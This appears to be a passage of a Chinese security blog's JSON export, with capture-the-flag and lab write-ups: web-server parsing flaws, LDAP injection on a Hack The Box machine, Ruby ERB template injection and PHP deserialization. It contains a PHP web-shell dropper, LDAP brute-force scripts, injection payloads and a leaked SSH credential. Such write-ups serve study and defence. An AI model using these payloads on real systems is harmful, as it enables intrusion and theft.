range(400): for j in range(32,127): data = &#123; &#x27;cmd&#x27;:payload.format(num1=str(i),num2=chr(j)) &#125; start_time = time() requests.post(url,data=data) if time()-start_time&gt;2: flag += chr(j) print(flag) if chr(j) == &#x27;&#125;&#x27;: exit()","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"服务器文件解析漏洞记录","date":"2020-08-19T05:26:06.000Z","path":"Web_security/basic_learning/25.服务器文件解析漏洞记录/","text":"服务器文件解析漏洞记录 没有新东西，简单记录一下。 https://www.anquanke.com/post/id/166616 0x01 IIS文件解析漏洞 使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 目录解析 形式：www.xxx.com/xx.asp/xx.jpg 原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析 形式：www.xxx.com/xx.asp;.jpg 原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 补充 IIS6.0的解析漏洞同样存在于IIS7.5版本。 0x02 Apache文件解析漏洞 多后缀 Apache1.x和2.x 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。 conf配置 1、如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含 .php 即使文件名是 test2.php.jpg 也会以 php 来执行。 2、如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg即使扩展名是 jpg，一样能以 php 方式执行。 罕见后缀 Apache 配置文件中会有.+.ph(p[345]?|t|tml)此类的正则表达式，被当 php 程序执行的文件名要符合正则表达式，否则就算 Apache 把某文件当 php 程序，php 自己不认它，也是无用。 也就是说php3，php4，php5，pht，phtml也是可以被解析的。 .htaccess 要想使 .htaccess 文件生效，需要两个条件: 一是在 Apache 的配置文件中写上： 1AllowOverrideAll 若这样写则 .htaccess 不会生效： 1AllowOverrideNone 二是 Apache 要加载 mod_Rewrite 模块。加载该模块，需要在 Apache 的配置文件中写上： 1LoadModulerewrite_module&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so 若是在 Ubuntu 中，可能还需要执行命令： 1sudoa2enmod rewrite 配置完后需要重启 Apache。 如在 .htaccess 文件中写入： 1AddTypeapplication&#x2F;x-httpd-php xxx 就成功地使该 .htaccess 文件所在目录及其子目录中的后缀为 .xxx 的文件被 Apache 当做 php 文件。 还有一种写法： 123&lt;FilesMatch&quot;shell.jpg&quot;&gt; SetHandlerapplication&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 0x03 Nginx文件解析漏洞 PHP CGI解析漏洞 漏洞原理参考：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html 所以下面两种写法都会将1.jpg当作PHP来解析 123www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\\0.php 另外一种手法：上传一个名字为 test.jpg，以下内容的文件: 1&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;);?&gt; 然后访问 test.jpg/.php, 在这个目录下就会生成一句话木马 shell.php。 空字节代码执行漏洞 恶意用户发出请求http://example.com/file.ext％00.php就会将 file.ext 作为 PHP 文件解析。","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"服务器解析漏洞","slug":"服务器解析漏洞","permalink":"http://ca0y1h.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"浅谈LDAP注入攻击","date":"2020-08-18T13:02:44.000Z","path":"Web_security/basic_learning/24.浅谈LDAP注入攻击/","text":"文章首发于 安全客 从HTB靶机中浅谈LDAP注入攻击 最近在HackTheBox上氪了金（肉疼😭），做了一些已经retired的高质量靶机，不得不说质量还是很高的。其中有一个靶机叫做CTF，难度是最高级别的insane，主要是它考察的知识点比较冷门——LDAP注入。可能很多小伙伴都没怎么听说过这个漏洞，我想主要原因还是LDAP这个协议用的比较少，而且国内CTF比赛中我也基本上没有看到有考察这个点的。在网上搜了一下，发现最近一次出现这个考点的是在CSAW CTF Qualification Round 2018比赛中，题目直接告诉你了是考LDAP注入。刚好上个星期我在星盟内部分享中，也提到了这个知识点，那么本着聊胜于无，开阔知识面的本意下（其实是偷懒？），写下这篇浅谈LDAP注入攻击的文章。 0x01 LDAP介绍 什么是LDAP 在做靶机之前，我们首先来了解一下什么是LDAP？ 以下内容部分摘自2018 blackhat LDAP Injection &amp; Blind LDAP Injection LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。 那么转换成人话就是说，LDAP是用于访问目录服务（特别是基于X.500的目录服务）的轻量级客户端服务器协议，它通过TCP/IP传输服务运行。关键的地方就在于，数据是存储在目录中，而不是数据库中。的确，目录和数据库有很多共同之处，都能存储数据、并能在一定程度进行搜索和查询。这里就有一个问题了，目录和数据库的区别在哪？ 最重要的区别就是目录适合于存放静态数据，它存储的数据无论在类型和种类较之数据库中的数据都要更为繁多，包括音频、视频、可执行文件、文本等文件，另外目录中还存在目录的递归。既然是存放不同类型的静态数据，那么目录服务在进行优化后更适宜于读访问，而非写、修改等操作。 说了这么半天，感觉还是贴一张图来的更快。 上面这张图展示了LDAP的结构。我们都知道MySQL数据库中的数据都是按记录一条条记录存在表中，而LDAP是树结构的，数据存储在叶子节点上。比如要描述上图baby这个节点： 1cn&#x3D;baby, ou&#x3D;marketing, ou&#x3D;people, dc&#x3D;mydomain, dc&#x3D;org LDAP的基本概念 在大概知道LDAP是做什么、长什么样之后，我们再来了解一下LDAP的一些基本概念，主要是三个专有名词：条目（Entry）、属性（Attribute）、对象类（ObjectClass）。 条目 条目，也叫记录项，是LDAP中最基本的颗粒，就想字典中的词条或者是数据中的记录。通常对LDAP的添加、删除、修改、搜索都是以条目为基本单位。 属性 每个条目都可以有很多属性（Attribute），比如常见的人都有姓名、地址、电话等属性。每个属性都有名称及对应的值，属性值可以有单个、多个，比如你有多个邮箱。 此外，LDAP为人员组织机构中常见的对象都设计了属性(比如commonName，surname)。 对象类 对象类是属性的集合，LDAP预想了很多人员组织机构中常见的对象，并将其封装成对象类。比如人员（person）含有姓（sn）、名（cn）、电话(telephoneNumber)、密码(userPassword)等属性，单位职工(organizationalPerson)是人员(person)的继承类，除了上述属性之外还含有职务（title）、邮政编码（postalCode）、通信地址(postalAddress)等属性。 通过对象类可以方便的定义条目类型。每个条目可以直接继承多个对象类，这样就继承了各种属性。如果2个对象类中有相同的属性，则条目继承后只会保留1个属性。对象类同时也规定了哪些属性是基本信息，即必要属性和可选属性。 是不是听起来和面向对象语言有点相似，跟Java中的Object类一样，LDAP的根对象类就叫做top。 上述就是笔者对LDAP数据结构的简单介绍了，LDAP既然主要用于搜索查询，那它是怎么查询的呢？ LDAP的基本语法 LDAP的语法非常简单，一看就会，再看就懂。 以下部分内容摘自https://blog.csdn.net/leader_ww/article/details/4028672 =（等于） 例如，如果希望查找属性giveNname值为John的所有对象，可以使用(givenName=John)。这会返回对应条件的所有对象。 &amp;（逻辑与） 例如，如果希望查找居住在 Dallas 并且givenName为John的所有对象，可以使用(&amp;(givenName=John)(l=Dallas))。 请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。 |（逻辑或） 例如，如果希望查找属性givenName值为Jhon或者Jack的所有对象，可以使用(|(givenName=Jhon)(givenName=Jack))。 !（逻辑非） 例如，如果需要查找givenName为John的对象以外的所有对象。则应使用如下语句：(!givenName=John) *（通配符） 可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用(title=*)，这会返回title属性包含内容的所有对象。 另一个例子是：您知道某个对象的givenName属性的开头两个字母是“Jo”。那么，可以使用(givenName=Jo*)进行查找，这会返回givenName以Jo开头的所有对象。 Over~~LDAP的语法是不是很简单。 说了这么多，可能很多小伙伴还是心存疑问，已经部署成功的LDAP到底是长什么样子？ 我们可以通过Google Hacking intitle:”phpLDAPadmin” inurl:cmd.php来检索一下，真实的运行的LDAP服务的网站，这个地方我就贴一张图示范一下，包含了上面提到的所有概念。 0x02 LDAP注入攻击面 其实它的攻击手法和SQL注入的原理非常相似，在有漏洞的环境中，这些查询参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。由于比较简单，我这里就走马观花的方式来过一遍LDAP注入的不同类型。 以下部分内容摘自https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html AND注入 这种情况，应用会构造由”&amp;”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如： 1(&amp;(parameter1&#x3D;value1)(parameter2&#x3D;value2)) 这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。 比如说，为了验证客户端提供的user/password对，构造如下LDAP过滤器并发送给LDAP服务器： 1(&amp;(USER&#x3D;Uname)(PASSWORD&#x3D;Pwd)) 如果攻击者输入一个有效地用户名，如r00tgrok，然后再这个名字后面注入恰当的语句，password检查就会被绕过。 使得Uname=slisberger)(&amp;))，引入任何字符串作为Pwd值，构造如下查询并发送给服务器： 1(&amp;(USER&#x3D; slisberger)(&amp;)(PASSWORD&#x3D;Pwd)) OR注入 这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如： 1(|(parameter1&#x3D;value1)(parameter2&#x3D;value2)) 这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。 类似的，加入现在用于展示可用资源的查询为： 1(|(type&#x3D;Rsc1)(type&#x3D;Rsc2)) Rsc1和Rsc2表示系统中不同种类的资源。如果攻击者输入Rsc=printer)(uid=*)，则下面的查询被发送给服务器： 1(|(type&#x3D;printer)(uid&#x3D;*))(type&#x3D;scanner) 这样也会造成注入的产生。 盲注 SQL注入中有盲注，LDAP中也存在这种问题，包括下面介绍到的靶机用到的也是盲注的手法。 假设攻击者可以从服务器响应中推测出什么，尽管应用没有报出错信息，LDAP过滤器中注入的代码却生成了有效的响应或错误。攻击者可以利用这一行为向服务器问正确的或错误的问题。 还是用一个例子来说明。 假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器： 1(&amp;(objectClass&#x3D;printer)(type&#x3D;Epson*)) 使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击 1*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void Web应用会构造如下查询： 1(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void)(type&#x3D;Epson*)) 仅第一个LDAP过滤器会被处理： 1(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*)) 那么这样就和我们查询的初衷相违背了。 接下来就是这篇文章的重头戏了，我们主要从这个靶机中学到两点： 怎么发现LDAP注入漏洞 如何利用LDAP注入漏洞 0x03 从HTB靶机中学习LDAP注入 Initial Enunciation 拿到靶机先用Nmap扫一下端口 123456789101112131415# Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122Nmap scan report for ctf.htb (10.10.10.122)Host is up (1.8s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)| 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)|_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds 查看80端口 大概的意思就是让我们尝试去登录这个系统，但是不能用SQLmap或者Dirbuster去暴力猜解用户名和密码。 再去登录界面看一下： 提示我们是一个OTP，即One Time Password，一般而言是1分钟更新一次。 查看源码，发现有一个Hint 如果比较熟悉LDAP的话，这里的两个名词schema和existing attribute已经提示了是关于LDAP注入。 作者用一个已知的属性去存储了81位的token string，Google搜一下token string (81 digits)。 https://www.systutorials.com/docs/linux/man/1-stoken/ 可以看到一个关键的地方，Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings，和靶机的题目相契合，现在就有一点思路了，应该要去找到这个81位纯数字的token，然后用stoken工具去生成OTP。那么主要是找到token，唯一可以利用的就是这个登录框了。 先随便用某个用户名和密码登录admin:1234 返回User admin not found，再用SQL注入的万能密码试一试 直接是没有任何显示，应该是对一些特殊字符有黑名单过滤。Fuzz一下过滤了一些什么字符 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php –hw 233 代表过滤掉形如User xxx not found的返回信息。 我们发现+和&amp;返回的是232 Words，但是在页面测试一下 发现返回的还是User + not found或者User &amp; not found，这样的话应该是233 Words，而不是Wfuzz返回的232 Words。 我们尝试把这些特殊字符二次URL编码，看Web应用是否还能解析，用seclists中的doble_uri_hex.txt作为字典 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php 最后Fuzz出来的被过滤的字符就是 12345%2500 ---&gt; %00%2528 ---&gt; (%2529 ---&gt; )%252a ---&gt; *%255c ---&gt; \\ 这些被过滤的字符就是LDAP注入需要过滤的所有字符，再结合login.php页面源代码中的hint，可以确定是LDAP注入。 Getting User Access 先来看LDAP注入的最基本形式 1234(&amp; (password&#x3D;1234) (uid&#x3D;ca01h%00)) 具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回User ca01h not found。 假设只有一个括号： 假设有两个括号： 假设有三个括号： 当尝试到三个括号用于闭合时，成功返回了User ca01h%29%29%29%00 not found，那么这个登录框的LDAP查询的基本形式就是 123456789(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ca01h)))%00 ) (&amp;| (other comparing) )) 接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中%25%2a返回的消息长度为231 Words 发现回显的消息是Cannot login，说明可以用*通配符来盲注用户名，脚本如下： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python3### username_burp.pyimport sysimport timefrom string import ascii_lowercasefrom urllib.parse import quote_plusimport requestsURL = &#x27;http://10.10.10.122/login.php&#x27;username, done = &#x27;&#x27;, Falseprint()while not done: for c in ascii_lowercase: payload = username + c + quote_plus(&#x27;*&#x27;) data = &#123; &#x27;inputUsername&#x27;: payload, &#x27;inputOTP&#x27;: &#x27;1234&#x27; &#125; resp = requests.post(URL, data=data) if &#x27;Cannot login&#x27; in resp.text: username += c break sys.stdout.write(f&#x27;\\r&#123;username&#125;&#123;c&#125;&#x27;) time.sleep(0.2) else: done = Trueprint(f&#x27;[+] Username: &#123;username&#125; \\n&#x27;) 用户名为ldapuser 知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在PayloadsAllTheThings中找到： 123456789101112131415161718192021222324252627ccncocommonNamedcfacsimileTelephoneNumbergivenNamegnhomePhoneidjpegPhotolmailmobilenameoobjectClassouownerpagerpasswordsnstsurnameuidusernameuserPassword 如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式： 12345678910(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ldapuser) (FUZZ&#x3D;*) ) (&amp;| (other comparing) )) 此外还要把注入的字符ldapuser)(FUZZ=*进行二次URL编码，编码之后的结果ldapuser%2529%2528FUZZ%253d%252a。 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php 我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来猜解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本用来burp81位token 1234567891011121314151617181920212223242526272829#!/usr/bin/python3# pager_burp.pyimport requestsimport sysfrom time import sleepfrom string import digitstoken = &quot;&quot;URL = &quot;http://10.10.10.122/login.php&quot;attribute = &quot;pager&quot;loop = 1while loop &gt; 0: for digit in digits: token = token # ldapuser)(pager=&lt;token&gt;)* payload = f&quot;ldapuser%29%28&#123;attribute&#125;%3d&#123;token&#125;&#123;digit&#125;%2a&quot; data = &#123;&quot;inputUsername&quot;: payload, &quot;inputOTP&quot;: &quot;1234&quot;&#125; r = requests.post(URL, data=data) sys.stdout.write(f&quot;\\rToken: &#123;token&#125;&#123;digit&#125;&quot;) sleep(0.5) if b&quot;Cannot login&quot; in r.content: token += digit break elif digit == &quot;9&quot;: loop = 0 breakprint(f&#x27;[+] Token: &#123;token&#125; \\n&#x27;) 这里值得注意的是需要删掉最后的一个9，所以最后的token就是： 1285449490011357156531651545652335570713167411445727140604172141456711102716717000 接着用stoken工具导入token 生成OTP 成功登录后，跳转到page.php页面，可以执行命令 Damn it…提示我们ldapuser权限不够不能执行命令，这里有两种办法： 对group属性进行注入，即把后面group属性的filter截断 12345678910(&amp; (&amp; (pager&#x3D;&lt;token&gt;) (uid&#x3D;ldapuser)))%00 ) (| (group&#x3D;root) (group&#x3D;adm) )) 使用*通配符作为用户名登录 这里演示一下第一种方案，payload直接放到burp中 1ldapuser%2529%2529%2529%2500 再去执行ls命令 读取page.php文件： SSH登录：fdapuser:e398e27d5c4ad45086fe431120932a01","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"LDAP","slug":"LDAP","permalink":"http://ca0y1h.top/tags/LDAP/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"buuctf刷题——Ruby及Go","date":"2020-08-18T12:27:10.000Z","path":"Web_security/ctf_writeup/15.buuctf刷题——Ruby及Go/","text":"SCTF2019 Flag Shop 考点 JWT伪造 Ruby SSTI 解题 解法1 打开靶机，查看源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;h1 style=&quot;text-align: center&quot;&gt;Flag Shop&lt;/h1&gt;Your uid is &lt;b id=&quot;uid&quot;&gt;&lt;/b&gt;&lt;br /&gt;Your JinKela is &lt;b id=&quot;jkl&quot;&gt;&lt;/b&gt;&lt;br /&gt;Flag Price: &lt;b&gt;1000000000000000000000000000&lt;/b&gt;&lt;hr /&gt;&lt;button onclick=&quot;buyFlag()&quot; style=&quot;text-align: left&quot;&gt;buy flag&lt;/button&gt;&lt;button onclick=&quot;reset()&quot; style=&quot;text-align: center&quot;&gt;reset&lt;/button&gt;&lt;button onclick=&quot;work()&quot; style=&quot;text-align: right&quot;&gt;work&lt;/button&gt;&lt;script&gt; function buyFlag() &#123; fetch(&quot;/shop&quot;, &#123; method: &#x27;POST&#x27;, // or &#x27;PUT&#x27; headers: new Headers(&#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27; &#125;) &#125;) .then(res =&gt; res.text()) .then(function (response) &#123; alert(response) &#125;) .catch(error =&gt;alert(error)) &#125; function reset() &#123; if(confirm(&quot;This will reset all Jinkelas , Are U Sure?&quot;))&#123; fetch(&quot;/api/auth&quot;); setTimeout(()=&gt;window.location.reload(),500); &#125; &#125; function work() &#123; fetch(&quot;/work?name=bot&amp;do=bot is working&quot;) .then(()=&gt;window.location.reload()); &#125; fetch(&quot;/api/info&quot;,&#123; redirect: &#x27;manual&#x27; &#125;) .then(function (res) &#123; if(res.ok)&#123; return res.json() &#125; else&#123; fetch(&quot;/api/auth&quot;) reject; &#125; &#125;) .then(res=&gt;&#123; var info = res; console.log(info); document.getElementById(&quot;uid&quot;).innerText = info.uid; document.getElementById(&quot;jkl&quot;).innerText = info.jkl; &#125;) .catch(error =&gt; setTimeout(()=&gt;window.location.reload(),500))&lt;/script&gt; auth 之后会得到一个 jwt token。 现在就需要找到secret。扫描站点，发现有filebak 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586require &#x27;sinatra&#x27;require &#x27;sinatra/cookies&#x27;require &#x27;sinatra/json&#x27;require &#x27;jwt&#x27;require &#x27;securerandom&#x27;require &#x27;erb&#x27;set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do enable :logging file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;) file.sync = true use Rack::CommonLogger, fileendget &quot;/&quot; do redirect &#x27;/shop&#x27;, 302endget &quot;/filebak&quot; do content_type :text erb IO.binread __FILE__endget &quot;/api/auth&quot; do payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125; auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = authendget &quot;/api/info&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do erb :shopendget &quot;/work&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; auth = auth[0] unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;) puts ENV[&quot;FLAG&quot;] end end if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = auth ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result endendpost &quot;/shop&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;) else auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125; auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = auth json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;) endenddef islogin if cookies[:auth].nil? then redirect to(&#x27;/shop&#x27;) endend 重点关注work路由 123456789101112131415161718get &quot;/work&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; auth = auth[0] unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;) puts ENV[&quot;FLAG&quot;] end end if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = auth ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result endend 可以看到 /work 那里有 ERB 模板，还直接把可控参数 name 拼进去了，那么这里我们就可以传入一些构造过的参数，来达到我们的目的了。但是限制了payload的长度为7。比如 name=&lt;%=1%&gt;，就会得 1。 一些常规的SSTI注入由于长度的限制，最多只能由两个字符，肯定是行不通的。 对照 Ruby 全局变量表 ，不断 fuzz，发现$有东西 12345unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;) puts ENV[&quot;FLAG&quot;] endend 其在模板渲染之前之前有个匹配，就是这里。要是 SECRET 参数存在则对其进行匹配，用传入的这个值去和 ENV[&quot;SECRET&quot;] 匹配，匹配上了就往终端输出 FLAG。然后我们 SECRET 不传试试，这样括号里的匹配就不进行，只进行括号外的 ENV[&quot;SECRET&quot;] 的匹配，再用全局变量 $ 就可以读出 ENV[&quot;SECRET&quot;] 了。 解法2 HTTP参数传递类型差异产生的攻击面 先介绍一个trick 1234$a = &quot;qwertyu&quot;$b = Array[&quot;bbb&quot;,&quot;cc&quot;,&quot;d&quot;]puts &quot;$a: #&#123;$a[0,3]&#125;&quot;puts &quot;$b: #&#123;$b[0,3]&#125;&quot; 输出结果 12$a: qwe$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;] $b变量原本是数组，但是由于被拼接到了字符串中，所以数组做了一个默认的类型转换变成了[&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;] 有了这个trick，上面代码[0,7]从原本的限制7个字符突然变成了限制7个数组长度 payload 1&#x2F;work?SECRET&#x3D;a&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6 需要对do参数urlencode编码 参考 https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html https://evoa.me/archives/15/","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"Ruby和Go","slug":"CTF/Ruby和Go","permalink":"http://ca0y1h.top/categories/CTF/Ruby%E5%92%8CGo/"}]},{"title":"buuctf刷题——PHP反序列化","date":"2020-08-18T11:45:46.000Z","path":"Web_security/ctf_writeup/6.buuctf刷题——PHP反序列化/","text":"BUUCTF刷题——PHP反序列化 LCTF2018 Bestphp’s revenge 这篇文章分析的很到位：https://www.anquanke.com/post/id/164569#h2-5 考点 session反序列化 Soapclient + ssrf CRLF 解题 index.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123; $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; flag.php 12345678only localhost can get flag!session_start(); echo &#39;only localhost can get flag!&#39;; $flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125; only localhost can get flag! 思路如下： 利用第4行回调函数来调用session_start()用于覆盖session序列化引擎为php_serilaze； 构造SSRF的Soap类的序列化字符串配合上面的序列化注入写入session文件，并且构造的序列化字符串中利用了CRLF漏洞写入了我们规定的seesion_id； 然后再通过第4行的回调函数调用extract()函数用于变量覆盖，覆盖掉变量b为回调函数call_user_func； 同时我们可以传入name=SoapClient，那么最后call_user_func($b, 